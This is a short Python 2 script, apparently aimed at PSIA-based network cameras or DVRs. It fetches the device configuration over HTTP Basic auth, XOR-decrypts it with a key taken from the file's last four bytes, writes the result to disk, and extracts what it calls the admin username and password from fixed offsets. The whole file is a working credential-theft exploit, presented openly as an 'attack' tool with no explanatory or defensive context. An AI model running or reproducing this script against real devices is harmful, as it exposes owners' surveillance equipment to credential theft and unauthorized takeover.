import urllib2
import base64
import argparse
import sys

def decrypt(config):
    print '[*] Decrypting config'
    key = config[-4:]
    plaintext = ''
    for i in range(len(config)/4):
        for j in range(4):
            plaintext += chr(ord(config[i*4+j]) ^ ord(key[j]))
    return plaintext

def attack(target, username, password, output):
    base_url = 'http://' + target + '/PSIA/System/ConfigurationData'
    headers = { 'Authorization': 'Basic ' + base64.b64encode('%s:%s' % (username, password)) }
    print '[*] Attacking %s ' % target
    req = urllib2.Request(base_url, None, headers)
    try:
        response = urllib2.urlopen(req)
        config = response.read()
    except Exception as e:
        print e
        return
    plaintext = decrypt(config)
    print '[*] Writing output file %s' % output
    with open(output, 'w') as f:
        f.write(plaintext)
    user = plaintext[0x45A0:0x45A0+32]
    pwd  = plaintext[0x45C0:0x45C0+16]
    print 'Probably the admin user is %s and the password is %s' % (user, pwd)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target', action='store', help='target host to attack')
    parser.add_argument('username', action='store', help='username to be used to authenticate against target')
    parser.add_argument('password', action='store', help="username's password")
    parser.add_argument('output', action='store', help="filename to write the plaintext config")
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    attack(options.target, options.username, options.password, options.output)
